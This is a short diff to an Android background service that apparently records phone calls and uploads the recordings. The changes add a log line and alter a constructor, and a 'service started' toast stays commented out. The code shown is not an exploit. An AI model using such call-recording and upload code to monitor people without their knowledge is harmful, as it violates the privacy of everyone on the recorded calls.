@@ -33,6 +33,8 @@ public class PhoneCallStateService extends Service
     {
         SystemSet.getIntance().init(this.getApplicationContext());
         //开启上传线程
+        Log.e("Service", "onStartCommand...");
+
         UploadTools.createUploadThreadAndStart();
         doInThread();
         return START_STICKY;
@@ -45,7 +47,7 @@ public class PhoneCallStateService extends Service
         //通话结束，保存文件到外部存储器上
         Log.e("Recorder", "正在监听中...");
         outgoingCallState = new OutgoingCallState(this);
-        outgoingCallReciver = new OutgoingCallReciver(this);
+        outgoingCallReciver = new OutgoingCallReciver();
         outgoingCallState.startListen();
 //        Toast.makeText(this, "服务已启动", Toast.LENGTH_LONG).show();
 
